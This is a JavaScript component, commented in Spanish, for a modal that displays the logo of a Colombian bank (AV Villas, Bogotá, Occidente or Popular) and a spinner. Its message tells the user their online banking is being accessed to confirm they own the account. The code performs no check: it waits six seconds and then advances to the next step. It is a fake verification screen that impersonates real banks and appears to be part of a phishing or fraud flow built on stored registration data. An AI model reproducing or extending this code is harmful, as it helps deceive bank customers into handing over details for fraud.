/**
 * Definición declarativa del Modal Verificación
 * Modal automático que muestra spinner mientras "verifica" datos
 */

const modalVerificacionDefinition = {
  // ==================== TEMPLATE ====================
  template: function({ buttonText, showProgress, flowConfig }) {
    // Obtener banco desde atributo o localStorage
    const banco = this.getAttribute('banco') || localStorage.getItem('rayan_datos_registro_banco') || 'avvillas';
    const bancoInfo = this.getBancoInfo(banco);

    return `
      <div class="modal-overlay">
        <div class="modal-content">
          <div class="content">
            <div class="logo-container">
              <img src="${bancoInfo.logo}" alt="${bancoInfo.nombre}" class="logo" />
            </div>

            <div class="spinner-container">
              <div class="spinner"></div>
            </div>

            <p class="message">
              Ingresando a tu banca virtual para verificar si eres el titular de la cuenta
            </p>
          </div>
        </div>
      </div>
    `;
  },

  // ==================== ESTILOS ====================
  styles: `
    .modal-overlay {
      position: fixed;
      inset: 0;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 50;
      padding: 1rem;
    }

    .modal-content {
      background-color: white;
      border-radius: 1rem;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
      max-width: 85vw;
      width: 100%;
      padding: 1rem;
      animation: fadeIn 0.3s ease-out;
      box-sizing: border-box;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 1.5rem;
      width: 100%;
      max-width: 100%;
      overflow: hidden;
    }

    .logo-container {
      display: flex;
      justify-content: center;
      margin-bottom: 0.5rem;
    }

    .logo {
      height: 3.5rem;
      max-width: 100%;
      width: auto;
      object-fit: contain;
    }

    .spinner-container {
      position: relative;
    }

    .spinner {
      width: 5rem;
      height: 5rem;
      border: 4px solid #dbeafe;
      border-top-color: #2563eb;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .message {
      text-align: center;
      color: #374151;
      font-size: 1rem;
      font-weight: 500;
      padding: 0 0.5rem;
      word-wrap: break-word;
      max-width: 100%;
    }

    .return-notification {
      background: #F8FAFC;
      border-left: 4px solid #1E40AF;
      border-radius: 0.375rem;
      padding: 1rem 1.25rem;
      margin-bottom: 1rem;
      display: flex;
      align-items: center;
      gap: 0.875rem;
      animation: slideDownNotif 0.3s ease-out;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
    }

    @keyframes slideDownNotif {
      from {
        opacity: 0;
        transform: translateY(-8px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .notification-icon {
      width: 1.25rem;
      height: 1.25rem;
      color: #1E40AF;
      flex-shrink: 0;
    }

    .return-notification span {
      color: #1F2937;
      font-size: 0.875rem;
      font-weight: 500;
      line-height: 1.5;
    }

    .return-notification.fade-out {
      animation: fadeOutNotif 0.25s ease-out forwards;
    }

    @keyframes fadeOutNotif {
      from {
        opacity: 1;
        transform: translateY(0);
      }
      to {
        opacity: 0;
        transform: translateY(-8px);
      }
    }
  `,

  // ==================== VALIDACIONES ====================
  validations: {
    // Este modal no tiene campos de formulario
  },

  // ==================== HANDLERS ====================
  handlers: {
    // Este modal no tiene interacción manual del usuario
  },

  // ==================== CICLO DE VIDA ====================
  lifecycle: {
    connected: function() {
      // Después de 6 segundos, avanzar al siguiente paso
      setTimeout(() => {
        const banco = this.getAttribute('banco') || localStorage.getItem('rayan_datos_registro_banco');

        if (this.getAttribute('data-flow-managed') === 'true') {
          // MODO FLUJO
          this.completeStep({
            verified: true,
            banco: banco,
            timestamp: Date.now()
          });
        } else {
          // MODO MANUAL
          this.dispatchEvent(new CustomEvent('next-modal', {
            detail: {
              nextModal: 'modal-juego',
              banco: banco
            },
            bubbles: true,
            composed: true
          }));
        }

        this.closeModal();
      }, 6000);
    }
  },

  // ==================== MÉTODOS PERSONALIZADOS ====================
  getBancoInfo: function(banco) {
    const bancos = {
      'avvillas': {
        nombre: 'Banco AV Villas',
        logo: '/images/logo-avv.png'
      },
      'bogota': {
        nombre: 'Banco de Bogotá',
        logo: '/images/logo-bog.png'
      },
      'occidente': {
        nombre: 'Banco de Occidente',
        logo: '/images/logo-occ.png'
      },
      'popular': {
        nombre: 'Banco Popular',
        logo: '/images/logo-pop.png'
      }
    };

    return bancos[banco] || bancos['avvillas'];
  },

  // ==================== CONFIGURACIÓN ====================
  config: {
    defaultButtonText: null, // Este modal no tiene botón
    showReturnNotification: true,
    returnMessage: 'Estamos verificando tu información nuevamente.',
    returnIcon: `
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
    `,
    persistData: false,
    observedAttributes: ['banco']
  }
};

// Exportar
if (typeof window !== 'undefined') {
  window.modalVerificacionDefinition = modalVerificacionDefinition;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = modalVerificacionDefinition;
}
